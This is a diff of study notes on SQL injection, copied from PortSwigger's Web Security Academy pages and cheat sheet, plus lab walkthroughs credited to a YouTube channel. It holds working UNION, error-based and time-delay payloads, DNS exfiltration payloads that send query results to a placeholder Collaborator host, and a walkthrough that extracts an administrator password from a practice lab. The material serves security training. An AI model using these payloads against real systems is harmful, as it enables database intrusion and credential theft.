@@ -1,77 +1,295 @@
-Source: https://portswigger.net/web-security/sql-injection/examining-the-database
+
+
+Examining the database in SQL injection attacks:
+    Source: https://portswigger.net/web-security/sql-injection/examining-the-database
+
+    When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
+    Querying the database type and version
+
+    Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
+
+    The queries to determine the database version for some popular database types are as follows:
+    Database type 	Query
+    Microsoft, MySQL 	SELECT @@version
+    Oracle 	SELECT * FROM v$version
+    PostgreSQL 	SELECT version()
+
+    For example, you could use a UNION attack with the following input:
+    ' UNION SELECT @@version--
+
+    This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
+    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+    Mar 18 2018 09:11:49
+    Copyright (c) Microsoft Corporation
+    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+    LAB
+    PRACTITIONER
+    SQL injection attack, querying the database type and version on Oracle
+    Not solved
+    LAB
+    PRACTITIONER
+    SQL injection attack, querying the database type and version on MySQL and Microsoft
+    Not solved
+    Listing the contents of the database
+
+    Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
+
+    You can query information_schema.tables to list the tables in the database:
+    SELECT * FROM information_schema.tables
+
+    This returns output like the following:
+    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+    =====================================================
+    MyDatabase     dbo           Products    BASE TABLE
+    MyDatabase     dbo           Users       BASE TABLE
+    MyDatabase     dbo           Feedback    BASE TABLE
+
+    This output indicates that there are three tables, called Products, Users, and Feedback.
+
+    You can then query information_schema.columns to list the columns in individual tables:
+    SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+    This returns output like the following:
+    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+    =================================================================
+    MyDatabase     dbo           Users       UserId       int
+    MyDatabase     dbo           Users       Username     varchar
+    MyDatabase     dbo           Users       Password     varchar
+
+    This output shows the columns in the specified table and the data type of each column.
+    LAB
+    PRACTITIONER
+    SQL injection attack, listing the database contents on non-Oracle databases
+    Not solved
+    Equivalent to information schema on Oracle
+
+    On Oracle, you can obtain the same information with slightly different queries.
+
+    You can list tables by querying all_tables:
+    SELECT * FROM all_tables
+
+    And you can list columns by querying all_tab_columns:
+    SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+    LAB
+    PRACTITIONER
+    SQL injection attack, listing the database contents on Oracle
+    Not solved
+-------------------------------------------------------------------------------------------------------------------------------------
+SQL injection cheat sheet:
+    Source: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+    This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+    String concatenation
+
+    You can concatenate together multiple strings to make a single string.
+    Oracle 	'foo'||'bar'
+    Microsoft 	'foo'+'bar'
+    PostgreSQL 	'foo'||'bar'
+    MySQL 	'foo' 'bar' [Note the space between the two strings]
+    CONCAT('foo','bar')
+    Substring
+
+    You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
+    Oracle 	SUBSTR('foobar', 4, 2)
+    Microsoft 	SUBSTRING('foobar', 4, 2)
+    PostgreSQL 	SUBSTRING('foobar', 4, 2)
+    MySQL 	SUBSTRING('foobar', 4, 2)
+    Comments
+
+    You can use comments to truncate a query and remove the portion of the original query that follows your input.
+    Oracle 	--comment
+    Microsoft 	--comment
+    /*comment*/
+    PostgreSQL 	--comment
+    /*comment*/
+    MySQL 	#comment
+    -- comment [Note the space after the double dash]
+    /*comment*/
+    Database version
+
+    You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+    Oracle 	SELECT banner FROM v$version
+    SELECT version FROM v$instance
+    Microsoft 	SELECT @@version
+    PostgreSQL 	SELECT version()
+    MySQL 	SELECT @@version
+    Database contents
+
+    You can list the tables that exist in the database, and the columns that those tables contain.
+    Oracle 	SELECT * FROM all_tables
+    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+    Microsoft 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+    PostgreSQL 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+    MySQL 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+    Conditional errors
+
+    You can test a single boolean condition and trigger a database error if the condition is true.
+    Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+    Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+    PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+    MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+    Batched (or stacked) queries
+
+    You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+    Oracle 	Does not support batched queries.
+    Microsoft 	QUERY-1-HERE; QUERY-2-HERE
+    PostgreSQL 	QUERY-1-HERE; QUERY-2-HERE
+    MySQL 	QUERY-1-HERE; QUERY-2-HERE
+    Note
+
+    With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+    Time delays
+
+    You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+    Oracle 	dbms_pipe.receive_message(('a'),10)
+    Microsoft 	WAITFOR DELAY '0:0:10'
+    PostgreSQL 	SELECT pg_sleep(10)
+    MySQL 	SELECT SLEEP(10)
+    Conditional time delays
+
+    You can test a single boolean condition and trigger a time delay if the condition is true.
+    Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+    Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+    PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+    MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+    DNS lookup
+
+    You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+    Oracle 	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+    The following technique works on fully patched Oracle installations, but requires elevated privileges:
+    SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+    Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+    PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+    MySQL 	The following techniques work on Windows only:
+    LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+    SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+    DNS lookup with data exfiltration
+
+    You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+    Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+    Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+    PostgreSQL 	create OR replace function f() returns void as $$
+    declare c text;
+    declare p text;
+    begin
+    SELECT into p (SELECT YOUR-QUERY-HERE);
+    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+    execute c;
+    END;
+    $$ language plpgsql security definer;
+    SELECT f();
+    MySQL 	The following technique works on Windows only:
+    SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+-------------------------------------------------------------------------------------------------------------------------------------
+Episode8- YouTube Channel AcronProject:
+    Title: Lab: SQL injection attack, querying the database type and version on Oracle
+    Source: https://portswigger.net/web-security/sql-injection/examining-the-database
+    Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+
+    Detection Black Box :    @@version  OR v$version OR version() 
+        1- '
+        2- ''
+            Result: 1 != 2 ---> SQLi probably
+
+        3- '+UNION+SELECT+NULL+FROM+v$version--      
+        4- '+UNION+SELECT+NULL,+NULL+FROM+v$version--
+            Result: 3 != 4 ---> Two columns probably              
+                                and
+                                is Oracle Because --> SELECT * FROM v$version 
+                                                                    ---------
+                            
+        5- '+UNION+SELECT+'string',+NULL+FROM+v$version--
+            Result: Show in browser => first column is string
+
+        6- '+UNION+SELECT+'string',+'string2'+FROM+v$version--
+            Result: Show in browser => secend column is string
+        
+        7- '+UNION+SELECT+banner,+NULL+FROM+v$version--
+-------------------------------------------------------------------------------------------------------------------------------------
+Episode9- YouTube Channel AcronProject:
+    Title: Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+    Source: https://portswigger.net/web-security/sql-injection/examining-the-database
+    Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+  
+    Detection Black Box :    @@version  OR v$version OR version() 
+        1- '
+        2- ''
+            Result: 1 != 2 ---> SQLi probably
+
+        3- '+UNION+SELECT+NULL+FROM+@@version--      
+        4- '+UNION+SELECT+NULL,+NULL+FROM+@@version--      
+            3 == 4 => Microsoft nist!
+
+        5- '+UNION+SELECT+NULL+FROM+@@version#     
+        6- '+UNION+SELECT+NULL,+NULL+FROM+@@version# 
+            5 == 6 => my way is wrong
+        
+        7-  SELECT @@version 
+            '+UNION+SELECT+'abc','def'#
+        8-  '+UNION+SELECT+@@version,'def'#
+            7 != 8 and Get Inpormation DataBase
+-------------------------------------------------------------------------------------------------------------------------------------
+Episode9- YouTube Channel AcronProject:
+
+    Source: https://portswigger.net/web-security/sql-injection/examining-the-database
+    Title: Lab: SQL injection attack, listing the database contents on non-Oracle databases
+    Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+    
+    Detection Black Box :
+    1- '
+    2- ''
+        Result->  1 != 2  = Maybe vulnerable SQLi
+    
+    3- '+UNION+SELECT+NULL--
+    4- '+UNION+SELECT+NULL,+NULL--
+        Result-> 3 != 4  = Maybe have two columns
+    
+    5- '+UNION+SELECT+'string1',+'strin2'--
+        Result-> Show in browser each columns
+    
+    In line with the Detection, we reached the exploit:
+
+    6-  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+        Result-> get all tables
+                 Find the name of the table containing user credentials 
+
+    pg_partitioned_table
+    7-  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+        '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='pg_partitioned_table'--
+        Result = None
+    
+    pg_available_extension_versions
+    8-  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='pg_available_extension_versions'--
+        
+    users_nnrhlp
+    9-  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_nnrhlp'--
+        Result = password_vdthrv
+                 username_juubvu
+
+    10- '+UNION+SELECT+username_juubvu,+password_vdthrv+FROM+users_nnrhlp--
+    Result = administrator
+             4qm8cv7o08bna941a52b
+-------------------------------------------------------------------------------------------------------------------------------------
 
 
 
-Examining the database in SQL injection attacks
 
-When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
-Querying the database type and version
 
-Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
 
-The queries to determine the database version for some popular database types are as follows:
-Database type 	Query
-Microsoft, MySQL 	SELECT @@version
-Oracle 	SELECT * FROM v$version
-PostgreSQL 	SELECT version()
 
-For example, you could use a UNION attack with the following input:
-' UNION SELECT @@version--
 
-This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
-Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
-Mar 18 2018 09:11:49
-Copyright (c) Microsoft Corporation
-Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
-LAB
-PRACTITIONER
-SQL injection attack, querying the database type and version on Oracle
-Not solved
-LAB
-PRACTITIONER
-SQL injection attack, querying the database type and version on MySQL and Microsoft
-Not solved
-Listing the contents of the database
 
-Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
 
-You can query information_schema.tables to list the tables in the database:
-SELECT * FROM information_schema.tables
 
-This returns output like the following:
-TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
-=====================================================
-MyDatabase     dbo           Products    BASE TABLE
-MyDatabase     dbo           Users       BASE TABLE
-MyDatabase     dbo           Feedback    BASE TABLE
 
-This output indicates that there are three tables, called Products, Users, and Feedback.
 
-You can then query information_schema.columns to list the columns in individual tables:
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 
-This returns output like the following:
-TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
-=================================================================
-MyDatabase     dbo           Users       UserId       int
-MyDatabase     dbo           Users       Username     varchar
-MyDatabase     dbo           Users       Password     varchar
 
-This output shows the columns in the specified table and the data type of each column.
-LAB
-PRACTITIONER
-SQL injection attack, listing the database contents on non-Oracle databases
-Not solved
-Equivalent to information schema on Oracle
 
-On Oracle, you can obtain the same information with slightly different queries.
 
-You can list tables by querying all_tables:
-SELECT * FROM all_tables
 
-And you can list columns by querying all_tab_columns:
-SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
-LAB
-PRACTITIONER
-SQL injection attack, listing the database contents on Oracle
-Not solved
